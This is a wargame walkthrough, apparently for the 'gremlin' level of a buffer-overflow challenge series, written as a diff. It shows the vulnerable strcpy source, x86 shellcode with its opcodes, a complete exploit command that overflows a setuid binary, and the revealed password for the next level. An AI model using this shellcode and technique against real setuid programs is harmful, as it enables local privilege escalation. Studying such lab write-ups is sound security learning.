@@ -1,0 +1,93 @@
+there is file named gremlin is set setuid in start directory.
+or you can find vulnerable executable by shell command `find / -perm +6000 2> /dev/null`.
+then you're going to see doubtful return like this one anyway.
+
+-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
+
+and also it has uid of gremlin, if we can bof, we can hack!
+
+there is gremlin.c which is source code of gremlin is the vulerable executable with kindness.
+
+int main(int argc, char *argv[])
+{
+    char buffer[256];
+    if(argc < 2){
+        printf("argv error\n");
+        exit(0);
+    }
+    strcpy(buffer, argv[1]);
+    printf("%s\n", buffer);
+}
+
+buffer size is set by 256 that is the perfect size to upload shell code in it.
+using strcpy function which has vulerability for bof.
+also there is no filterring prevent bof or simillar.
+
+so you can make a shell.S which is the shell source code like this.
+
+.section .text
+.globl _start
+
+_start:
+        xor %eax, %eax # 0 -> %eax
+        push %eax # the end of the string
+        push $0x73736170 # -+
+        push $0x2d796d2f # -|- to push "/bin/my-pass" in stack memory
+        push $0x6e69622f # -+
+
+        push %eax # ---------+
+        lea 4(%esp), %ebx # -|- for arguments of execve system call
+        push %ebx # ---------+
+
+        mov %eax, %edx # ----+
+        movb $11, %al # -----|- input system call arguments
+        lea 8(%esp), %ebx # -|- system call number 11 is execve
+        lea 4(%esp), %ecx # -+
+
+        int $0x80
+
+it's written in at&t assembly grammer
+
+follow below sequence to build that one.
+as -o shell.o shell.S
+ld -o shell shell.o
+
+and now you're supposed to have executable file named shell.
+so do execute by typping ./shell
+and you will get the result of gate's my-pass.
+
+you can see opcode of shell by `objdump -d shell`.
+
+and you can see below one.
+
+08048074 <_start>:
+ 8048074:	31 c0                	xor    %eax,%eax
+ 8048076:	50                   	push   %eax
+ 8048077:	68 70 61 73 73       	push   $0x73736170
+ 804807c:	68 2f 6d 79 2d       	push   $0x2d796d2f
+ 8048081:	68 2f 62 69 6e       	push   $0x6e69622f
+ 8048086:	50                   	push   %eax
+ 8048087:	8d 5c 24 04          	lea    0x4(%esp,1),%ebx
+ 804808b:	53                   	push   %ebx
+ 804808c:	89 c2                	mov    %eax,%edx
+ 804808e:	b0 0b                	mov    $0xb,%al
+ 8048090:	8d 5c 24 08          	lea    0x8(%esp,1),%ebx
+ 8048094:	8d 4c 24 04          	lea    0x4(%esp,1),%ecx
+ 8048098:	cd 80                	int    $0x80
+
+you just gather only opcodes.
+\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\x89\xc2\xb0\x0b\x8d\x5c\x24\x08\x8d\x4c\x24\x04\xcd\x80
+
+length of this opcodes is 38
+
+if want to check 16 alignment of the gremlin's ebp,
+`cp gremlin gremlincp` && `gdb gremlincp` will work.
+
+in my case
+it's 0x8
+
+so
+in my case
+./gremlin "$(printf "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x2f\x6d\x79\x2d\x68\x2f\x62\x69\x6e\x50\x8d\x5c\x24\x04\x53\x89\xc2\xb0\x0b\x8d\x5c\x24\x08\x8d\x4c\x24\x04\xcd\x80")$(for x in `seq 1 222`; do printf "\x90"; done)$(printf "\x18\xf9\xff\xbf")"
+
+so next password is "hello bof world"
